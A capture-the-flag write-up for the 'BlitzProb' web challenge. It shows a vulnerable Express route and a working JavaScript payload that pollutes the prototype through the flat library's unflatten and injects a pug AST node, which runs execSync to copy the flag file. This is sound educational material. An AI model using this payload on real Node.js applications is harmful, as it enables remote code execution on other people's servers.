---
title: BlitzProb
date: 2021-04-25
categories: [web]
tags: [cyberapocalpyse2021]
toc: false
---

This challenge contained a Prototype Pollution to RCE via AST Injection. You can read more about it in this great [blog](https://blog.p6.is/AST-Injection/) post. (\* ^ ω ^)

The webpage looks like this:
![](/assets/img/blitzProb_web.png#center)


## Vulnerability
Going through the source code, we can see in the file "challenge/routes/index.js" that the function "unflatten" is called after receiving a post request:

``` javascript
const path              = require('path');
const express           = require('express');
const pug               = require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
	const { song } = unflatten(req.body);

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});

module.exports = router;
```

After reviewing the "package.json" file we can see that "flat" “5.0.0” is installed, which suffers from a Prototype Pollution vulnerability via Abstract Syntax Tree. [Here](https://github.com/hughsk/flat/issues/105) you can find the PoC.

## Exploitation
To exploit this vulnerability and read the flag, we simply open the web console and send the payload below to "/api/submit":

```javascript
let CMD = "process.mainModule.require('child_process').execSync('cat /app/flag* >> /app/static/js/flag.txt')"

fetch('/api/submit', {
	method: 'POST',
	body: JSON.stringify({
		'song.name': "Not Polluting with the boys",
		"__proto__.block": {
			"type": "Text", 
			"line": CMD
		}
	}),
	headers: {'Content-Type': 'application/json'}
}).then(r => {
	return r.text();
})
```

The flag file has been written to the static directory of the web server. After visiting /static/js/flag.txt we see the flag:

> CHTB{p0llute_with_styl3}

٩(◕‿◕｡)۶